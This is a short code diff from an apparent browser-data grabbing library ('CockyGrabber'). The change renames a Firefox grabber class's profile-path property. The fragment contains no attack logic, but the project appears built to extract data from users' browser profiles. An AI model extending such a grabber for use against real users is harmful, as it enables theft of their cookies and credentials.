@@ -4,7 +4,7 @@ namespace CockyGrabber.Grabbers
 {
     public class FirefoxGrabber : GeckoGrabber
     {
-        public override string ProfilesPath
+        public override string ProfileDirPath
         {
             get
             {
